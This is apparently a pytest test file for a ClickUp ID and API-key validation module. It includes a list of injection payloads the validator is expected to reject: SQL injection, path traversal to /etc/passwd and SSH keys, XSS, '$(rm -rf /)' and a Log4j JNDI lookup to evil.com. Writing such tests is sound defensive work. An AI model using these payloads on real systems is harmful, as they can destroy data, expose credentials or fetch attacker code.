#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Unit tests for validation.py module.

Tests the input validation functions that protect against injection attacks
and ensure ClickUp ID formats are correct.
"""

import sys
import os
# Add parent directory to path to import validation module
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

import pytest
from validation import validate_clickup_id, validate_api_key, sanitize_url_parameter, build_safe_api_url


class TestValidateClickUpId:
    """Test the validate_clickup_id function with various ID types and inputs."""
    
    @pytest.mark.unit
    def test_valid_task_ids(self):
        """Test valid task ID formats."""
        valid_task_ids = [
            "8xdfdjbgd",  # 9 char lowercase alphanumeric
            "8xdfm9vm",   # 8 char lowercase alphanumeric
            "abc12345",   # 8 char mixed
            "12345678"    # 8 char numeric
        ]
        
        for task_id in valid_task_ids:
            result = validate_clickup_id(task_id, 'task')
            assert result == task_id
    
    @pytest.mark.unit
    def test_valid_workspace_ids(self):
        """Test valid workspace/team ID formats."""
        valid_workspace_ids = [
            "333",
            "90170402244889",
            "12345",
            "1"
        ]
        
        for workspace_id in valid_workspace_ids:
            result = validate_clickup_id(workspace_id, 'workspace')
            assert result == workspace_id
            
            # Test 'team' alias
            result = validate_clickup_id(workspace_id, 'team')
            assert result == workspace_id
    
    @pytest.mark.unit
    def test_valid_space_ids(self):
        """Test valid space ID formats."""
        valid_space_ids = [
            "90170402244889",
            "abc123DEF456",
            "SPACE123",
            "space456"
        ]
        
        for space_id in valid_space_ids:
            result = validate_clickup_id(space_id, 'space')
            assert result == space_id
    
    @pytest.mark.unit
    def test_valid_list_ids(self):
        """Test valid list ID formats."""
        valid_list_ids = [
            "90170402244889",
            "list123ABC",
            "LIST456def",
            "123456789"
        ]
        
        for list_id in valid_list_ids:
            result = validate_clickup_id(list_id, 'list')
            assert result == list_id
    
    @pytest.mark.unit
    def test_valid_folder_ids(self):
        """Test valid folder ID formats."""
        valid_folder_ids = [
            "folder123ABC",
            "FOLDER456def",
            "123456789folder",
            "abc123"
        ]
        
        for folder_id in valid_folder_ids:
            result = validate_clickup_id(folder_id, 'folder')
            assert result == folder_id
    
    @pytest.mark.unit
    def test_valid_custom_task_ids(self):
        """Test valid custom task ID formats."""
        valid_custom_ids = [
            "PROJ_123",
            "TASK_456",
            "DEV_789_FINAL",
            "BUG_001"
        ]
        
        for custom_id in valid_custom_ids:
            result = validate_clickup_id(custom_id, 'custom_task')
            assert result == custom_id
    
    @pytest.mark.unit
    @pytest.mark.security
    def test_injection_attacks_rejected(self):
        """Test that common injection attacks are rejected."""
        malicious_inputs = [
            "'; DROP TABLE tasks; --",  # SQL injection
            "../../../etc/passwd",       # Path traversal
            "<script>alert('xss')</script>",  # XSS
            "task_id&api_key=stolen",   # URL manipulation
            "$(rm -rf /)",              # Command injection
            "%3Cscript%3E",            # URL encoded script
            "../../../../root/.ssh/id_rsa",  # Path traversal
            "' OR '1'='1",             # SQL injection
            "${jndi:ldap://evil.com}", # Log4j style injection
            "{{7*7}}",                 # Template injection
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValueError, match="Invalid .* ID format"):
                validate_clickup_id(malicious_input, 'task')
    
    @pytest.mark.unit
    def test_invalid_task_ids(self):
        """Test invalid task ID formats."""
        invalid_task_ids = [
            "",           # Empty
            "abc",        # Too short
            "UPPERCASE",  # Wrong case for task
            "abc@123",    # Special characters
            "abc-123",    # Dash not allowed
            "abc.123",    # Dot not allowed
            "abc 123",    # Space not allowed
            "abcdefghijk", # Too long (11 chars)
        ]
        
        for invalid_id in invalid_task_ids:
            with pytest.raises(ValueError):
                validate_clickup_id(invalid_id, 'task')
    
    @pytest.mark.unit
    def test_invalid_workspace_ids(self):
        """Test invalid workspace ID formats."""
        invalid_workspace_ids = [
            "",           # Empty
            "abc",        # Not numeric
            "123abc",     # Mixed alphanumeric
            "123.456",    # Decimal
            "123-456",    # Dash
            "123 456",    # Space
        ]
        
        for invalid_id in invalid_workspace_ids:
            with pytest.raises(ValueError):
                validate_clickup_id(invalid_id, 'workspace')
    
    @pytest.mark.unit
    def test_empty_id_rejected(self):
        """Test that empty IDs are rejected."""
        with pytest.raises(ValueError, match="ID cannot be empty"):
            validate_clickup_id("", 'task')
        
        with pytest.raises(ValueError, match="ID cannot be empty"):
            validate_clickup_id(None, 'task')
    
    @pytest.mark.unit
    def test_whitespace_handling(self):
        """Test that whitespace is properly handled."""
        # Should strip whitespace and validate
        result = validate_clickup_id("  8xdfdjbgd  ", 'task')
        assert result == "8xdfdjbgd"
        
        # Should reject whitespace-only
        with pytest.raises(ValueError):
            validate_clickup_id("   ", 'task')
    
    @pytest.mark.unit
    def test_type_conversion(self):
        """Test that non-string inputs are converted to strings."""
        # Numeric input should be converted and validated
        result = validate_clickup_id(123456, 'workspace')
        assert result == "123456"
        
        # But still respect format rules
        with pytest.raises(ValueError):
            validate_clickup_id(123, 'task')  # Too short for task ID


class TestValidateApiKey:
    """Test the validate_api_key function."""
    
    @pytest.mark.unit
    def test_valid_api_keys(self):
        """Test valid API key formats."""
        valid_keys = [
            "pk_1234567890abcdef",
            "abc123def456ghi789",
            "API_KEY_123456789",
            "very_long_api_key_with_underscores_123"
        ]
        
        for key in valid_keys:
            result = validate_api_key(key)
            assert result == key
    
    @pytest.mark.unit
    @pytest.mark.security
    def test_invalid_api_keys(self):
        """Test invalid API key formats."""
        invalid_keys = [
            "",              # Empty
            "short",         # Too short
            "key@domain",    # Special characters
            "key with spaces", # Spaces
            "key-with-dashes", # Dashes
            "key.with.dots", # Dots
        ]
        
        for key in invalid_keys:
            with pytest.raises(ValueError):
                validate_api_key(key)
    
    @pytest.mark.unit
    def test_api_key_whitespace_handling(self):
        """Test API key whitespace handling."""
        result = validate_api_key("  pk_1234567890abcdef  ")
        assert result == "pk_1234567890abcdef"


class TestSanitizeUrlParameter:
    """Test the sanitize_url_parameter function."""
    
    @pytest.mark.unit
    def test_safe_parameters(self):
        """Test that safe parameters pass through unchanged."""
        safe_params = [
            "abc123",
            "test_param",
            "param-with-dash",
            "MiXeDcAsE123"
        ]
        
        for param in safe_params:
            result = sanitize_url_parameter(param)
            assert result == param
    
    @pytest.mark.unit
    @pytest.mark.security
    def test_dangerous_parameters_sanitized(self):
        """Test that dangerous parameters are sanitized."""
        dangerous_params = [
            ("param@domain", "paramdomain"),
            ("param with spaces", "paramwithspaces"),
            ("param/with/slashes", "paramwithslashes"),
            ("param?query=value", "paramqueryvalue"),
            ("param&other=value", "paramothervalue"),
            ("param<script>", "paramscript"),
        ]
        
        for dangerous, expected in dangerous_params:
            result = sanitize_url_parameter(dangerous)
            assert result == expected
    
    @pytest.mark.unit
    def test_empty_parameter(self):
        """Test empty parameter handling."""
        assert sanitize_url_parameter("") == ""
        assert sanitize_url_parameter(None) == ""


class TestBuildSafeApiUrl:
    """Test the build_safe_api_url function."""
    
    @pytest.mark.unit
    def test_simple_url_construction(self):
        """Test simple URL construction."""
        url = build_safe_api_url(
            'https://api.clickup.com/api/v2',
            'task',
            task_id=('8xdfdjbgd', 'task')
        )
        assert url == 'https://api.clickup.com/api/v2/task/8xdfdjbgd'
    
    @pytest.mark.unit
    def test_multiple_parameters(self):
        """Test URL construction with multiple parameters."""
        url = build_safe_api_url(
            'https://api.clickup.com/api/v2',
            'team',
            workspace_id=('333', 'workspace'),
            list_id=('90170402244889', 'list')
        )
        assert url == 'https://api.clickup.com/api/v2/team/333/90170402244889'
    
    @pytest.mark.unit
    def test_base_url_normalization(self):
        """Test that base URL trailing slashes are handled."""
        url1 = build_safe_api_url(
            'https://api.clickup.com/api/v2/',  # With trailing slash
            'task',
            task_id=('8xdfdjbgd', 'task')
        )
        url2 = build_safe_api_url(
            'https://api.clickup.com/api/v2',   # Without trailing slash
            'task',
            task_id=('8xdfdjbgd', 'task')
        )
        assert url1 == url2
    
    @pytest.mark.unit
    @pytest.mark.security
    def test_invalid_id_in_url_construction(self):
        """Test that invalid IDs cause URL construction to fail."""
        with pytest.raises(ValueError):
            build_safe_api_url(
                'https://api.clickup.com/api/v2',
                'task',
                task_id=('../../etc/passwd', 'task')
            )
    
    @pytest.mark.unit
    def test_generic_id_fallback(self):
        """Test that non-tuple IDs use generic validation."""
        url = build_safe_api_url(
            'https://api.clickup.com/api/v2',
            'task',
            task_id='8xdfdjbgd'  # No type specified
        )
        assert url == 'https://api.clickup.com/api/v2/task/8xdfdjbgd'


class TestEdgeCases:
    """Test edge cases and boundary conditions."""
    
    @pytest.mark.unit
    def test_unicode_handling(self):
        """Test that unicode characters are handled properly."""
        # Should reject unicode in task IDs
        with pytest.raises(ValueError):
            validate_clickup_id("tâsk123", 'task')
        
        # Should reject emojis
        with pytest.raises(ValueError):
            validate_clickup_id("task🚀123", 'task')
    
    @pytest.mark.unit
    def test_boundary_lengths(self):
        """Test boundary conditions for length validation."""
        # Task ID boundaries (8-9 characters)
        assert validate_clickup_id("a1234567", 'task') == "a1234567"  # 8 chars
        assert validate_clickup_id("a12345678", 'task') == "a12345678"  # 9 chars
        
        with pytest.raises(ValueError):
            validate_clickup_id("a123456", 'task')  # 7 chars (too short)
        
        with pytest.raises(ValueError):
            validate_clickup_id("a123456789", 'task')  # 10 chars (too long)
    
    @pytest.mark.unit
    def test_unknown_id_type(self):
        """Test that unknown ID types fall back to generic validation."""
        result = validate_clickup_id("abc123_DEF", 'unknown_type')
        assert result == "abc123_DEF"
    
    @pytest.mark.unit
    def test_case_sensitivity(self):
        """Test case sensitivity rules."""
        # Task IDs should be lowercase
        with pytest.raises(ValueError):
            validate_clickup_id("ABC12345", 'task')
        
        # Custom task IDs should be uppercase
        with pytest.raises(ValueError):
            validate_clickup_id("proj_123", 'custom_task')
        
        # Other types are case-insensitive
        assert validate_clickup_id("SpAcE123", 'space') == "SpAcE123"


if __name__ == '__main__':
    pytest.main([__file__])